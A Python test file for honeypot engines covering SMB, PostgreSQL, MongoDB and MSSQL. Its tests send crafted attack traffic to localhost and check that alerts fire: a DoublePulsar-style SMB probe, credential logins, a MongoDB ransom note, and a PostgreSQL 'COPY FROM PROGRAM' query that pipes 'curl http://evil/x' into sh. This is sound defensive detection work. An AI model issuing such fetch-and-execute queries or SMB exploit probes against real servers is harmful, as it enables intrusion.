"""High-value capture tests for the SMB / PostgreSQL / MongoDB / MSSQL honeypots.

Beyond the generic self-test (probe → alert), these exercise the attack
scenarios that make each engine worth deploying: EternalBlue/DoublePulsar
detection, credential capture (incl. TDS password de-obfuscation), Postgres
COPY-FROM-PROGRAM RCE, and Mongo ransom-note detection.
"""

import asyncio
import contextlib
import os
import socket
import struct

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


def _free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    buf = event_buffer.get_buffer()
    await buf.start()
    yield
    await buf.stop()
    event_buffer.reset_for_tests()
    await close_db()


async def _register(name, hp_type):
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotStatus

    port = _free_port()
    async with get_session() as session:
        session.add(Honeypot(name=name, type=hp_type, port=port, status=HoneypotStatus.RUNNING))
        await session.flush()
    return port


async def _alerts_of_type(event_type):
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == event_type))
        return list(result.scalars().all())


# ── SMB ──────────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_smb_detects_doublepulsar_ping():
    """An SMB1 Trans2 SESSION_SETUP (0x000e) after negotiate is the DoublePulsar
    backdoor check — must flag CRITICAL smb_exploit_attempt."""
    from honeypot_mcp.engines.smb import SMBEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("smb-eb", HoneypotType.SMB)
    engine = SMBEngine()
    cid = await engine.start("smb-eb", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            # Negotiate (SMB1).
            neg = b"\xffSMB" + bytes([0x72]) + b"\x00" * 27 + b"\x00\x0c\x00\x02NT LM 0.12\x00"
            writer.write(b"\x00" + len(neg).to_bytes(3, "big") + neg)
            await writer.drain()
            await asyncio.wait_for(reader.read(256), timeout=3.0)
            # Trans2 (command 0x32) carrying subcommand 0x000e.
            trans2 = (
                b"\xffSMB" + bytes([0x32]) + b"\x00" * 27 + struct.pack("<H", 0x000E) + b"\x00" * 8
            )
            writer.write(b"\x00" + len(trans2).to_bytes(3, "big") + trans2)
            await writer.drain()
            await asyncio.sleep(0.3)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await engine.stop(cid)

    events = await _alerts_of_type("smb_exploit_attempt")
    assert len(events) == 1
    assert events[0].severity.value == "critical"
    assert "doublepulsar" in events[0].payload["ioc"].lower()


# ── PostgreSQL ────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_postgresql_captures_password():
    """The full startup → cleartext-auth → password flow must capture the
    username, database, and password."""
    from honeypot_mcp.engines.postgresql import PostgreSQLEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("pg-cred", HoneypotType.POSTGRESQL)
    engine = PostgreSQLEngine()
    cid = await engine.start("pg-cred", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            params = b"user\x00admin\x00database\x00prod\x00\x00"
            body = struct.pack("!I", 196608) + params
            writer.write(struct.pack("!I", len(body) + 4) + body)
            await writer.drain()
            # Expect an AuthenticationCleartextPassword ('R').
            resp = await asyncio.wait_for(reader.read(64), timeout=3.0)
            assert resp[:1] == b"R", resp
            # Send PasswordMessage 'p'.
            pw = b"S3cr3tP@ss\x00"
            writer.write(b"p" + struct.pack("!I", len(pw) + 4) + pw)
            await writer.drain()
            await asyncio.sleep(0.3)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await engine.stop(cid)

    events = await _alerts_of_type("postgresql_login_attempt")
    assert len(events) == 1
    p = events[0].payload
    assert p["username"] == "admin"
    assert p["database"] == "prod"
    assert p["password"] == "S3cr3tP@ss"
    assert p["service"] == "postgresql"


@pytest.mark.asyncio
async def test_postgresql_captures_copy_from_program_rce():
    """After login is accepted, a `COPY ... FROM PROGRAM` (superuser command
    execution) must be captured as CRITICAL postgresql_copy_program_rce."""
    from honeypot_mcp.engines.postgresql import PostgreSQLEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("pg-rce", HoneypotType.POSTGRESQL)
    engine = PostgreSQLEngine()
    cid = await engine.start("pg-rce", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            body = struct.pack("!I", 196608) + b"user\x00postgres\x00database\x00postgres\x00\x00"
            writer.write(struct.pack("!I", len(body) + 4) + body)
            await writer.drain()
            await asyncio.wait_for(reader.read(64), timeout=3.0)  # auth request
            pw = b"x\x00"
            writer.write(b"p" + struct.pack("!I", len(pw) + 4) + pw)
            await writer.drain()
            await asyncio.wait_for(reader.read(512), timeout=3.0)  # post-auth preamble
            # Now issue the RCE query.
            q = b"COPY t FROM PROGRAM 'curl http://evil/x | sh'\x00"
            writer.write(b"Q" + struct.pack("!I", len(q) + 4) + q)
            await writer.drain()
            await asyncio.sleep(0.3)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await engine.stop(cid)

    events = await _alerts_of_type("postgresql_copy_program_rce")
    assert len(events) == 1
    assert events[0].severity.value == "critical"
    assert "from program" in events[0].payload["query"].lower()


# ── MongoDB ───────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_mongodb_flags_ransom_note():
    """An insert carrying a ransom note (bitcoin/recover language) must flag
    CRITICAL mongodb_ransom_note with the note text captured."""
    from honeypot_mcp.engines.mongodb import MongoDBEngine, _bson_encode
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mongo-ransom", HoneypotType.MONGODB)
    engine = MongoDBEngine()
    cid = await engine.start("mongo-ransom", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            note = "All your databases are backed up. Send 0.5 bitcoin to recover: 1A2b3C wallet"
            doc = _bson_encode({"insert": "READ_ME", "documents": [{"msg": note}]})
            body = struct.pack("<I", 0) + b"\x00" + doc  # OP_MSG flagBits + section 0
            header = struct.pack("<iiii", 16 + len(body), 1, 0, 2013)
            writer.write(header + body)
            await writer.drain()
            await asyncio.wait_for(reader.read(512), timeout=3.0)
            await asyncio.sleep(0.3)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await engine.stop(cid)

    events = await _alerts_of_type("mongodb_ransom_note")
    assert len(events) == 1
    assert events[0].severity.value == "critical"
    joined = " ".join(events[0].payload["strings"]).lower()
    assert "bitcoin" in joined


@pytest.mark.asyncio
async def test_mongodb_answers_ismaster():
    """isMaster must get a believable reply (ismaster:true) so the scanner
    proceeds — otherwise we capture nothing past the handshake."""
    from honeypot_mcp.engines.mongodb import MongoDBEngine, _bson_encode
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mongo-hello", HoneypotType.MONGODB)
    engine = MongoDBEngine()
    cid = await engine.start("mongo-hello", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            doc = _bson_encode({"isMaster": 1})
            body = struct.pack("<i", 0) + b"admin.$cmd\x00" + struct.pack("<ii", 0, 1) + doc
            header = struct.pack("<iiii", 16 + len(body), 1, 0, 2004)
            writer.write(header + body)
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(512), timeout=3.0)
            # The reply BSON should contain the "ismaster" field name.
            assert b"ismaster" in resp
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
    finally:
        await engine.stop(cid)


# ── MSSQL ─────────────────────────────────────────────────────────────────────


def _tds_encode_password(password: str) -> bytes:
    """Client-side TDS password obfuscation: swap nibbles then XOR 0xA5, over
    the UTF-16LE bytes."""
    out = bytearray()
    for b in password.encode("utf-16-le"):
        swapped = ((b & 0x0F) << 4) | ((b & 0xF0) >> 4)
        out.append(swapped ^ 0xA5)
    return bytes(out)


@pytest.mark.asyncio
async def test_mssql_captures_and_deobfuscates_credentials():
    """A TDS Login7 must yield the UTF-16LE username and the de-obfuscated
    password, with service=mssql."""
    from honeypot_mcp.engines.mssql import MSSQLEngine, _tds_packet
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mssql-cred", HoneypotType.MSSQL)
    engine = MSSQLEngine()
    cid = await engine.start("mssql-cred", port, {})
    try:
        user = "sa"
        password = "P@ssw0rd!"
        user_u16 = user.encode("utf-16-le")
        pw_enc = _tds_encode_password(password)

        body = bytearray(72) + user_u16 + pw_enc  # fixed(36)+table(36)+data
        struct.pack_into("<HH", body, 40, 72, len(user))  # UserName ib/cch
        struct.pack_into("<HH", body, 44, 72 + len(user_u16), len(password))  # Password
        struct.pack_into("<I", body, 0, len(body))  # Length
        packet = _tds_packet(0x10, bytes(body))  # 0x10 = LOGIN7

        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(packet)
            await writer.drain()
            with contextlib.suppress(Exception):
                await asyncio.wait_for(reader.read(256), timeout=2.0)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await engine.stop(cid)

    events = await _alerts_of_type("mssql_login_attempt")
    assert len(events) == 1
    p = events[0].payload
    assert p["username"] == "sa"
    assert p["password"] == "P@ssw0rd!"
    assert p["service"] == "mssql"


@pytest.mark.asyncio
async def test_mssql_prelogin_declines_encryption():
    """The PRELOGIN response must advertise ENCRYPT_NOT_SUP (0x02) so the client
    sends Login7 in the clear."""
    from honeypot_mcp.engines.mssql import MSSQLEngine, _tds_packet
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mssql-pre", HoneypotType.MSSQL)
    engine = MSSQLEngine()
    cid = await engine.start("mssql-pre", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(_tds_packet(0x12, b"\xff"))  # 0x12 = PRELOGIN
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(256), timeout=2.0)
            assert resp[0] == 0x04  # TDS response packet
            # ENCRYPT_NOT_SUP (0x02) must appear in the option data.
            assert b"\x02" in resp[8:]
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
    finally:
        await engine.stop(cid)
